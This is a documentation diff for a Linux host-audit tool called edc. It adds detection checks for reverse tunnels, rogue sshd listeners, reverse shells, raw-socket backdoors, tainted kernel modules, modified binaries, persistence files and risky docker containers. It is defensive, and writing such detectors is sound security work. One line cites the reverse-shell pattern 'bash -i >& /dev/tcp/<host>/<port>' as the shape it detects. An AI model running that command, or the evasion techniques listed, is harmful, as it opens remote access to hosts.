@@ -90,6 +90,8 @@ On Linux, `storage` reads `/proc/mdstat` and `smartctl --json`. If `smartctl` is
 
 `time` and `reboot` show `skip` on macOS. Linux results do not include `thermal` and `backup`.
 
+`reboot` reads `/var/run/reboot-required`, `/var/run/reboot-required.pkgs`, and the kernels in `/boot`. The summary names the reason. A newer kernel in `/boot` means that the update takes effect only after a reboot. Other packages are libraries or services. The evidence shows the time of the request with the number of days, the installed kernels with the running kernel and its boot time, and all packages of the request.
+
 `--group` uses the inventory and the OpenSSH setup of `edc remote`. Each host must have an edc with `check`. The table shows one row for each host. If a host gives no result, the row shows the reason, for example an SSH failure or an edc without `check`.
 
 To accept a known finding, add a `[check]` table to `config.toml`:
@@ -169,66 +171,94 @@ If a webhook does not answer with a 2xx status, edc writes the reason to stderr 
 
 ## Host audit (Linux)
 
-`edc audit` reads the exposure and the settings of a Linux host. It reads files, sysctl values, the listening sockets, the login records, and `/proc`. It changes nothing, and it sends nothing over the network. It ends in less than one second.
+`edc audit` reads the exposure and the settings of a Linux host. It reads files, sysctl values, the listening sockets, the login records, `/proc`, and the docker socket. It changes nothing, and it sends nothing over the network. If the page cache holds these files, it ends in less than one second. The first run on a host with a large journal can take several seconds.
 
 ```bash
 sudo edc audit
-sudo edc audit -v               # add the values and the rules behind each result
+sudo edc audit -v               # add the evidence of each pass result
 sudo edc audit --json -         # one result for each check
 ```
+
+A `warn` or `fail` result shows its evidence below the summary, for example the logins, the processes, or the files that the check found. `-v` also shows the evidence of a `pass` result. In the evidence, a line without indent is a finding, an indented line is a value that edc read for the finding, and a line that starts with `→` is the explanation of edc. With color, findings are bold and explanations are gray.
 
 | Check | Fail | Warn |
 |---|---|---|
 | `net.exposed` | a database or control port listens beyond loopback, and the host firewall accepts inbound traffic | the same port, but the firewall drops by default or edc cannot read it |
 | `net.firewall` | | the input chains have no rule |
+| `net.ipv6_open` | | the host has a public IPv6 address, the IPv6 input accepts by default, and a socket listens on IPv6 |
 | `net.ip_forward` | | forwarding is on, and edc finds no container runtime |
+| `net.reverse_tunnel` | | an sshd connection process listens on a port (`ssh -R`), or an ssh client on this host opens a tunnel with `-R`, `-w`, `RemoteForward`, or `Tunnel` |
 | `ssh.root_login` | | `PermitRootLogin yes` |
 | `ssh.password_auth` | `PermitEmptyPasswords yes` with password login | password login is on |
+| `ssh.forwarding` | | `GatewayPorts yes` or `clientspecified`, or `PermitTunnel` is on |
 | `ssh.key_files` | another user can write `~/.ssh` or a file of `AuthorizedKeysFile` | |
 | `ssh.key_changed` | | the mtime or the ctime of a file of `AuthorizedKeysFile` is in the last 7 days |
+| `ssh.extra_sshd` | | an sshd listener runs outside `ssh.service` or `sshd.service`, or two or more sshd listeners run on a host without systemd |
 | `user.uid0` | an account other than root has UID 0 | |
 | `user.empty_pass` | an account has an empty password | |
 | `user.sudo_nopass` | | a sudo rule runs every command without a password |
 | `user.root_groups` | | the `docker` or `lxd` group has members |
 | `login.mismatch` | `lastlog` records a login that `wtmp` does not record, or `wtmp` and the sshd journal record a later login than `lastlog` | a remote terminal login in `wtmp` has no sshd `Accepted` entry in the journal, `wtmp` has records filled with zeros, or `wtmp` is empty and `lastlog` has logins |
+| `login.local_source` | | the sshd journal has an `Accepted` login from a loopback address or from an address of this host |
 | `history.tampered` | a bash or zsh history file links to `/dev/null` or is a character device, or it is empty or missing after a session of more than one minute | the history file did not change during the last session of more than one minute |
 | `history.disabled` | | a start file turns off the history: `unset HISTFILE`, `HISTFILE=/dev/null`, `HISTSIZE=0`, `HISTFILESIZE=0`, `SAVEHIST=0`, or `set +o history` |
 | `proc.unusual_exe` | | a process runs from `/tmp`, `/var/tmp`, or `/dev/shm`, from memory (`memfd`), or from a file or a shared library that was deleted outside the package directories |
 | `proc.preload` | | `/etc/ld.so.preload` has an entry, or a process runs with `LD_PRELOAD` |
+| `proc.socket_shell` | | the standard input or output of a process is a TCP connection (reverse shell) |
+| `proc.raw_socket` | | a process holds a packet or raw socket, and its executable is in a temporary directory, deleted, in memory, or in no dpkg package |
+| `persist.changed` | | a cron, systemd, startup, `sudoers.d`, `pam.d`, `ld.so.conf.d`, udev, or motd file, or a shell start file or `~/.ssh/rc` of an account, changed in the last 7 days |
 | `file.sensitive` | other users can read `/etc/shadow`, or write `/etc/passwd`, `/etc/sudoers`, or `docker.sock` | |
 | `file.path_writable` | other users can write a directory in the root `PATH`, or `PATH` has a relative entry | |
+| `file.pkg_modified` | the MD5 of a binary or a PAM module differs from the dpkg checksum of its package | |
 | `kernel.sysctl` | | a hardening value differs from the recommended value |
-| `patch.reboot` | | a package asks for a reboot, or `/boot` has a newer kernel than the running kernel |
+| `kernel.taint` | | `/proc/sys/kernel/tainted` shows a forced (F), out-of-tree (O), or unsigned (E) module |
+| `docker.escape` | | a running docker container is privileged, uses the host PID namespace, adds a capability such as `SYS_ADMIN`, mounts `docker.sock`, or mounts the host `/` with write access |
 | `ctr.privileged` | edc holds every capability, so the container is privileged | |
 | `ctr.docker_sock` | `/var/run/docker.sock` or `/run/docker.sock` is a socket in the container | |
 | `ctr.root_user` | | edc runs as UID 0 in the container |
 | `ctr.host_ns` | the container uses the PID namespace of the host | |
 
-The database and control ports are 2375, 2379, 3306, 5432, 6379, 9200, 10250, 11211, and 27017.
+The database, file sharing, remote desktop, and control ports are 111, 139, 445, 2049, 2181, 2375, 2376, 2379, 3306, 3389, 4369, 5432, 5672, 5900, 5984, 6379, 8086, 8500, 9042, 9092, 9200, 10250, 11211, 15672, and 27017. If the host firewall drops inbound traffic, a warning names the other ports that docker publishes on all addresses. Those ports pass the FORWARD chain, so the INPUT drop does not apply to them.
 
 The `ctr.*` checks run only inside a container. edc finds the container with the same markers as `edc info`: `KUBERNETES_SERVICE_HOST`, `/.dockerenv`, or `/run/.containerenv`. On a host, the report does not show these checks. If the container uses the PID namespace of the host, `ctr.host_ns` also compares the network namespace with the namespace of PID 1.
 
 The login and history checks compare records that an intruder can change. A `fail` tells you that two records disagree. It is not proof of an intrusion. Each result names the start of `wtmp`, because edc cannot compare a login before that time.
 
-`login.mismatch` reads `/var/log/wtmp`, the uncompressed `/var/log/wtmp.1`, and `/var/log/lastlog`. It compares the last login of each account in `lastlog` with the `wtmp` logins. The user, the terminal, and the time must agree within one second. edc reads only the last 64 MiB of each `wtmp` file. It does not read the SQLite records of `wtmpdb` or `lastlog2`. If only those records exist, the login checks show `skip`.
+`login.mismatch` reads `/var/log/wtmp`, the uncompressed `/var/log/wtmp.1`, and `/var/log/lastlog`. It compares the last login of each account in `lastlog` with the `wtmp` logins. The user, the terminal, and the time must agree within one second. edc reads only the last 64 MiB of each `wtmp` file. It does not read the SQLite records of `wtmpdb` or `lastlog2`. If only those records exist, `login.mismatch` shows `skip`.
 
 As root, edc also reads the `systemd-logind`, `sshd`, and `sshd-session` journal entries of the last 7 days. The PID of the sshd process joins the three sources. sshd writes only sessions with a terminal to `wtmp`, so `scp`, `sftp`, and `ssh host command` show only in the journal. With `-v`, `login.mismatch` lists these logins by user, host, and method. They do not change the result.
 
-The journal also checks `wtmp` and `lastlog` in the other direction. sshd writes `lastlog` at each terminal login, so a later login in `wtmp` and in the journal means that `lastlog` went back. A remote terminal login in `wtmp` without an `Accepted` entry gives a warning. journald can drop entries under its rate limit, so this is not a `fail`. OpenSSH 9.8 and later write the same PID to `wtmp`, to the `Accepted` entry, and to logind. One connection can open several terminals, for example with `ControlMaster`. Thus edc joins a `wtmp` login with the `Accepted` entry of the same PID, user, and address if the login starts before the connection ends. If `wtmp` holds a host name instead of an address (`UseDNS yes`), edc does not compare the address. The connection ends at the `session closed` entry of that PID, or at the next `Accepted` entry of that PID. A later login has a reused PID, and edc does not join it. If a connection started before the 7 days, edc uses the other journal entries of its PID and the user in its `session closed` entry. Before 9.8, `wtmp` holds the PID of the shell. If the PID of a login does not match, edc joins the login with an `Accepted` entry of the same user and host within 2 seconds, and a warning tells you the number of these logins. If two entries match, edc does not take a session end from the journal. If no login matches, edc does not join the two sources. If the journal has no `Accepted` entry, edc compares the logins after the first journal entry.
+The journal also checks `wtmp` and `lastlog` in the other direction. sshd writes `lastlog` at each terminal login, so a later login in `wtmp` and in the journal means that `lastlog` went back. A remote terminal login in `wtmp` without an `Accepted` entry gives a warning. journald can drop entries under its rate limit, so this is not a `fail`. OpenSSH 9.8 and later write the same PID to `wtmp`, to the `Accepted` entry, and to logind. One connection can open several terminals, for example with `ControlMaster`. Thus edc joins a `wtmp` login with the `Accepted` entry of the same PID, user, and address if the login starts before the connection ends. If `wtmp` holds a host name instead of an address (`UseDNS yes`), edc does not compare the address. The connection ends at the `session closed` entry of that PID, or at the next `Accepted` entry of that PID. A later login has a reused PID, and edc does not join it. If a connection started before the 7 days, edc uses the other journal entries of its PID and the user in its `session closed` entry. Before 9.8, `wtmp` holds the PID of the shell. If the PID of a login does not match, edc joins the login with an `Accepted` entry of the same user and host within 2 seconds, and a warning tells you the number of these logins. If two entries match, edc does not take a session end from the journal. If no login matches, edc does not join the two sources. Before 9.8, a second terminal on one connection (`ControlMaster`) has no new `Accepted` entry. If such a login is still open, edc follows the parents of its shell to the sshd process of the connection and joins the login with that `Accepted` entry. A closed login of this kind can have a reused shell PID, so edc does not follow its parents. If no login joins by PID, edc joins it with a connection of the same user and host that was open when the login started. A warning tells you the number of these logins. If the journal has no `Accepted` entry, edc compares the logins after the first journal entry.
+
+`login.local_source` reads the `Accepted` entries of `sshd` and `sshd-session` in the same journal range as `login.mismatch`. It needs root, but it does not need `wtmp`. If edc cannot read the journal, the check shows `skip`, not `pass`.
+
+A login is local if its source is a loopback address or an address of an interface of this host. A tunnel, a relay tool, and a local `ssh` command all give such a login. sshd sees a process on this host as the client. The check gives a warning if the range has one such login.
+
+The evidence shows an open connection first. The peer is the process that holds the other end of the connection. The line shows the PID, the name, the executable, and the arguments of the peer, up to 3 peers. edc masks secret values in the arguments. If edc finds no peer, the line says so. With `ssh -L`, `-D`, or `-J`, the peer is an `sshd-session` process that carries the tunnel. Then the line also names the ssh login that opened the tunnel: the user, the source address and port, the method, and the time. If that login is older than the journal range, the line shows the source address and port only. A connection is open only if the sshd process of the `Accepted` entry still holds the server socket. All other logins are closed. The evidence groups them by user, source, and method, with the count and the last time. It shows up to 10 lines. To accept a known tunnel, add `login.local_source` to `accept`.
+
+The check has these limits. The address list is the list at the time of the run. If the address of the host changed in the last 7 days, edc can miss a login from the old address. If a relay ends on another host, sshd sees the address of that host. An address inside a container is not an address of this host. A login that does not pass through sshd is not in the journal, and a deleted journal hides logins. If the source is a name, not an address, edc does not judge the entry, and a warning tells you the number. If edc cannot read the interface addresses, it compares loopback sources only. If edc cannot read the TCP table, it does not look for peers. A warning tells you in both cases. The peer lookup relies on the behavior of OpenSSH 10.0. On another version, an open connection can show as a closed login.
 
 `history.tampered` checks the accounts with UID 0 or UID 1000 and above that use bash or zsh. It compares the history file with the `pts/*` sessions in `wtmp`. A shell writes the history when it exits, so the file must change after the session starts. Some systems do not write a logout record to `wtmp`. On these systems, edc takes the session end from the `systemd-logind` journal. If neither source has the end, edc checks only the link to `/dev/null`, and a warning tells you the number of accounts that it did not compare. edc does not check an account if a start file sets `HISTFILE` to another path, or if zsh has no `HISTFILE`. edc also does not check an account if its start files set `HISTSIZE=0`, `HISTFILESIZE=0`, `SAVEHIST=0`, or `set +o history`, because then an empty history is normal. A symlink to a missing file and a directory count as a missing history file. A warning names each of these accounts. The check reads the history settings in the start files, but it does not run the shell. If a later start file changes a setting again, edc uses the later value. The evidence of `history.disabled` shows the file, the line, and the setting, but not the full line.
 
 The SSH key checks read the files of `AuthorizedKeysFile`. The default is `.ssh/authorized_keys .ssh/authorized_keys2`. A warning tells you if `AuthorizedKeysCommand` supplies keys, because edc cannot check them. `ssh.key_changed` uses the later of the mtime and the ctime of each file. `touch` can set the mtime back, but not the ctime. Administrators add keys after a login too, so the check gives a warning only. The evidence shows the last `wtmp` login before the change.
 
-`proc.unusual_exe` reads `/proc/<pid>/exe`. It ignores a deleted binary under `/usr`, `/bin`, `/sbin`, `/lib`, or `/lib64`. After a package upgrade, daemons continue to run from deleted binaries. It also ignores the memory copy that `runc` makes of itself. The check reads `/proc/<pid>/maps` for deleted shared libraries with the same rule. `proc.preload` reads `/etc/ld.so.preload` and the `LD_PRELOAD` value in `/proc/<pid>/environ`. Only root can read the environment of other users.
+The backdoor checks read `/proc` once. `net.reverse_tunnel` looks for an sshd connection process that listens on a port. An `ssh -R` client opens such a port, and a connection to it goes through the ssh connection. The check ignores loopback ports 6010 to 6099, because `ssh -X` uses them for X11. It also reads the arguments of each `ssh` client on this host. A `-R`, `-w`, `RemoteForward`, or `Tunnel` option opens a way from the remote host into this host. A `-L` or `-D` client is common, so the check ignores it. `RemoteForward` in `~/.ssh/config` is not in the arguments, so the check does not see it.
+
+`ssh.extra_sshd` reads the cgroup of each sshd listener. An sshd outside the ssh service can use its own config and log file, so its logins can miss the journal. An sshd in a container is not judged. `proc.socket_shell` gives a warning if the standard input or output of a process is a TCP connection. `bash -i >& /dev/tcp/<host>/<port>` makes this shape. A daemon that writes only its standard error to a socket is not judged. `proc.raw_socket` reads `/proc/net/packet`, `/proc/net/raw`, and `/proc/net/raw6`. A passive backdoor waits for a special packet on such a socket and has no listening port. A holder from a dpkg package, such as `systemd-networkd`, is not judged.
+
+`kernel.taint` reads `/proc/sys/kernel/tainted` and `/sys/module/*/taint`. The evidence names each tainted module and its file under `/lib/modules`. A module that has no file there was loaded from another path. A DKMS module, such as a GPU driver, also sets the taint, so the check gives a warning only. The proprietary (P) and livepatch (K) flags are not judged. The kernel keeps the taint until a reboot. `file.pkg_modified` compares the MD5 of the binaries and the PAM modules of 18 packages, such as `openssh-server`, `sudo`, `procps`, `coreutils`, and `libpam-modules`, with `/var/lib/dpkg/info/*.md5sums`. It skips a path that `dpkg-divert` moved. A host without dpkg shows `skip`.
+
+`persist.changed` reads the files that run commands at login, at boot, or on a schedule. It uses the later of the mtime and the ctime of each file. A symlink that `systemctl enable` makes counts as a file. If dpkg rewrote the list of the owning package within one hour of the change, the change came from a package upgrade, and the check does not judge the file. A warning tells you the number. The evidence shows the last `wtmp` login before each change. `docker.escape` reads the running containers through the docker socket. A read-only mount of the host `/` and the host network are not judged, because monitoring containers use them often. Containers of containerd or Kubernetes without docker are not read.
+
+`proc.unusual_exe` reads `/proc/<pid>/exe`. It ignores a deleted binary under `/usr`, `/bin`, `/sbin`, `/lib`, or `/lib64`. After a package upgrade, daemons continue to run from deleted binaries. It also ignores the memory copy that `runc` makes of itself. The evidence shows the start time, the parent process, and the state of a deleted file. If a new file is at the same path, the process runs the old binary until a restart. If no file is at the path, the file was removed. The check reads `/proc/<pid>/maps` for deleted shared libraries with the same rule. `proc.preload` reads `/etc/ld.so.preload` and the `LD_PRELOAD` value in `/proc/<pid>/environ`. Only root can read the environment of other users. If the host has dpkg records, the evidence names the package that owns each preloaded library. A library that no package owns was put there by hand. edc checks the `/lib` and `/usr/lib` forms of the path and the target of a symlink.
 
 The account checks read `/etc/passwd`. If `nsswitch.conf` takes accounts from `sss`, `ldap`, `winbind`, `nis`, `nisplus`, or `hesiod`, a warning tells you that edc did not check those accounts.
 
 Run it as root. Without root, edc cannot read the firewall, `/etc/shadow`, `/etc/sudoers`, or the homes of other users. These checks show `skip`, not `pass`.
 
-The firewall check reads `nft list ruleset`. If nft shows no input chain, it reads `iptables-save`. It counts the input rules, but it does not read the rule order. The check sees only this host. A cloud security group can still block a port, so a `fail` means that the host itself does not block the port.
+The firewall check reads `nft list ruleset`. If nft shows no input chain, it reads `iptables-save`. It counts the input rules, but it does not read the rule order. The check sees only this host. A cloud security group can still block a port, so a `fail` means that the host itself does not block the port. `net.ipv6_open` reads the IPv6 input separately: the `ip6` and `inet` tables of nft, or `ip6tables-save`. Many hosts drop IPv4 and accept IPv6. The check gives a warning only if the host has a public IPv6 address. A ULA address, such as a Tailscale address in `fd7a::/48`, and a link-local address are not public.
 
-The SSH checks read `sshd_config` and its `Include` files. The first value wins, as in sshd. A `Match` block applies only to some connections, so edc does not read it. Run `sshd -T` to see the effective values.
+The SSH checks read `sshd_config` and its `Include` files. The first value wins, as in sshd. The evidence shows each setting with its file and line. It also shows a later line that the first value overrides, because a change on that line has no effect. If the effective value is unsafe, the line also shows the recommended value and the reason. `ssh.forwarding` gives a warning for `GatewayPorts yes` or `clientspecified`, because a port that `ssh -R` opens then listens on all interfaces. It also gives a warning for `PermitTunnel`, because `ssh -w` then makes a network device between the two hosts. `AllowTcpForwarding yes` is the default, so the check only shows its value. A `Match` block applies only to some connections, so edc does not read it. Run `sshd -T` to see the effective values.
 
 To accept a known finding, add an `[audit]` table to `config.toml`:
 
@@ -238,7 +268,7 @@ accept = ["net.ip_forward", "user.root_groups"]
 allow_ports = [5432]
 ```
 
-`accept` holds check names from the table above. `net.exposed` does not judge the ports in `allow_ports`, and a warning names them. An unknown check name or a port outside 1 to 65535 makes the config invalid.
+`accept` holds check names from the table above. `patch.reboot` moved to the `reboot` check of `edc check`. If `accept` still lists it, the config stays valid, and `edc audit` prints a note. `net.exposed` does not judge the ports in `allow_ports`, and a warning names them. An unknown check name or a port outside 1 to 65535 makes the config invalid.
 
 An accepted finding stays in the report. It shows as `skip`, and its summary starts with a marker such as `accepted (fail)`. The marker follows the language setting. In JSON, `metrics.accepted` is `true`, and `metrics.accepted_status` holds the original status. An accepted finding does not change the exit code.
 
